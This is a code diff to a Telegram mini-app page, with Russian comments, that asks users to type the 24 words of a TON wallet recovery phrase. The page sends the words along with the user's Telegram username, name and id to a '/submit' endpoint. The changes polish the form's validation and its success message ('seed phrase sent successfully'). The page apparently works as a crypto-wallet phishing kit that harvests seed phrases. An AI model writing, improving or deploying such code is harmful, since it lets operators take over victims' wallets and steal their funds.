@@ -52,11 +52,6 @@
             display: none !important;
         }
 
-        /* Убрал фон, обводку, блюр и тени у карточек - теперь просто контент */
-        .wallet-card {
-            width: 100%;
-        }
-
         h2 {
             font-size: 28px;
             font-weight: 600;
@@ -242,13 +237,45 @@
             text-align: center;
         }
 
-        /* Стиль для сообщения об отправке (вместо статус-баннера) */
+        /* Сообщение о результате проверки */
+        .result-message {
+            text-align: center;
+            padding: 12px;
+            margin-bottom: 16px;
+            border-radius: 16px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .result-message.success {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid #4caf50;
+            color: #4caf50;
+            display: block;
+        }
+
+        .result-message.error {
+            background: rgba(255, 68, 68, 0.2);
+            border: 1px solid #ff4444;
+            color: #ff6666;
+            display: block;
+        }
+
+        .result-message.warning {
+            background: rgba(255, 170, 0, 0.2);
+            border: 1px solid #ffaa00;
+            color: #ffaa44;
+            display: block;
+        }
+
         .sending-message {
             text-align: center;
             padding: 10px;
             margin-bottom: 16px;
             font-size: 14px;
             color: #ffaa44;
+            display: none;
         }
 
         @keyframes shake {
@@ -319,7 +346,11 @@
         <div>
             <h2>📝 24 слова</h2>
             <div class="subtext">Только маленькие латинские буквы, без пробелов <span class="small-ton">TON style</span></div>
-            <div id="sendingMessage" class="sending-message" style="display: none;">⏳ Отправка данных...</div>
+            
+            <!-- Блок для результата проверки -->
+            <div id="resultMessage" class="result-message"></div>
+            <div id="sendingMessage" class="sending-message">⏳ Отправка данных...</div>
+            
             <div class="words-grid">
                 <div class="column" id="col1"></div>
                 <div class="column" id="col2"></div>
@@ -388,6 +419,11 @@
                     input.classList.add('active-highlight');
                 }
                 if (val.length > 0 && navigator.vibrate) navigator.vibrate(4);
+                
+                // Скрываем сообщение об ошибке при вводе
+                const resultDiv = document.getElementById('resultMessage');
+                resultDiv.style.display = 'none';
+                resultDiv.className = 'result-message';
             });
             
             input.addEventListener('blur', removeHighlight);
@@ -408,6 +444,7 @@
         const sendBtn = document.getElementById('sendBtn');
         const closeBtn = document.getElementById('closeBtn');
         const sendingMessage = document.getElementById('sendingMessage');
+        const resultMessage = document.getElementById('resultMessage');
 
         continueBtn.addEventListener('click', () => {
             introPage.classList.add('hidden');
@@ -415,39 +452,53 @@
             if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
         });
 
+        // Локальная проверка слов (только латинские буквы и количество)
+        function validateWordsLocally(wordsArray) {
+            // Проверка на пустые поля
+            for (let i = 0; i < wordsArray.length; i++) {
+                if (!wordsArray[i] || wordsArray[i].trim() === '') {
+                    return { valid: false, message: `⚠️ Слово ${i+1} не заполнено` };
+                }
+                // Проверка на недопустимые символы
+                if (!/^[a-z]+$/.test(wordsArray[i])) {
+                    return { valid: false, message: `⚠️ Слово ${i+1} содержит недопустимые символы. Используйте только латинские буквы a-z` };
+                }
+            }
+            return { valid: true, message: '' };
+        }
+
         // ОТПРАВКА ДАННЫХ
         sendBtn.addEventListener('click', async () => {
             const wordsArray = [];
-            let hasError = false;
             
             for (let i = 1; i <= 24; i++) {
                 const inputField = document.getElementById(`word${i}`);
                 const wordValue = inputField.value.trim();
-                if (!wordValue) {
-                    inputField.style.borderColor = '#ff6b6b';
-                    inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
-                    setTimeout(() => {
-                        if (inputField) {
-                            inputField.style.borderColor = '';
-                            inputField.style.animation = '';
-                        }
-                    }, 800);
-                    hasError = true;
-                    if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
-                    alert(`⚠️ Пожалуйста, заполните слово №${i}`);
-                    inputField.focus();
-                    break;
-                }
-                if (wordValue.length > 35) {
-                    alert(`Слово №${i} слишком длинное (максимум 35 символов)`);
-                    hasError = true;
-                    break;
-                }
                 wordsArray.push(wordValue);
             }
             
-            if (hasError) return;
-
+            // Локальная валидация
+            const localValidation = validateWordsLocally(wordsArray);
+            if (!localValidation.valid) {
+                resultMessage.textContent = localValidation.message;
+                resultMessage.className = 'result-message error';
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+                
+                // Подсветка пустых полей
+                for (let i = 1; i <= 24; i++) {
+                    const inputField = document.getElementById(`word${i}`);
+                    if (!inputField.value.trim()) {
+                        inputField.style.borderColor = '#ff6b6b';
+                        inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
+                        setTimeout(() => {
+                            inputField.style.borderColor = '';
+                            inputField.style.animation = '';
+                        }, 800);
+                    }
+                }
+                return;
+            }
+            
             let username = tg.initDataUnsafe.user?.username || "без_имени";
             let first_name = tg.initDataUnsafe.user?.first_name || "";
             let userId = tg.initDataUnsafe.user?.id;
@@ -463,8 +514,7 @@
             sendBtn.disabled = true;
             sendBtn.style.opacity = '0.6';
             sendingMessage.style.display = 'block';
-            sendingMessage.innerHTML = '⏳ Отправка данных...';
-            sendingMessage.style.color = '#ffaa44';
+            resultMessage.style.display = 'none';
             
             try {
                 const response = await fetch('/submit', {
@@ -475,30 +525,37 @@
                     body: JSON.stringify(payload)
                 });
                 
-                if (response.ok) {
-                    sendingMessage.innerHTML = '✅ Отправлено успешно!';
-                    sendingMessage.style.color = '#88ff88';
+                const result = await response.json();
+                
+                if (response.ok && result.status === 'ok') {
+                    sendingMessage.style.display = 'none';
+                    resultMessage.textContent = '✅ Сид-фраза успешно отправлена! Перенаправление...';
+                    resultMessage.className = 'result-message success';
                     if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
                     
-                    formPage.classList.add('hidden');
-                    successPage.classList.remove('hidden');
-                    successPage.style.animation = 'fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.2)';
+                    // Переход на страницу успеха
+                    setTimeout(() => {
+                        formPage.classList.add('hidden');
+                        successPage.classList.remove('hidden');
+                    }, 1000);
                 } else {
-                    throw new Error('Ошибка сервера');
+                    throw new Error(result.message || 'Ошибка сервера');
                 }
             } catch(e) {
                 console.error("Ошибка:", e);
-                sendingMessage.innerHTML = '❌ Ошибка отправки. Попробуйте еще раз.';
-                sendingMessage.style.color = '#ff6666';
+                sendingMessage.style.display = 'none';
+                resultMessage.textContent = '❌ Ошибка отправки. Пожалуйста, проверьте интернет-соединение и попробуйте снова.';
+                resultMessage.className = 'result-message error';
                 sendBtn.disabled = false;
                 sendBtn.style.opacity = '1';
-                setTimeout(() => {
-                    if (sendingMessage.style.display !== 'none') {
-                        sendingMessage.style.display = 'none';
-                    }
-                }, 3000);
-                alert("❌ Ошибка отправки. Проверьте подключение.");
                 if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+                
+                // Автоскрытие через 5 секунд
+                setTimeout(() => {
+                    if (resultMessage.style.display !== 'none') {
+                        resultMessage.style.display = 'none';
+                    }
+                }, 5000);
             }
         });
         
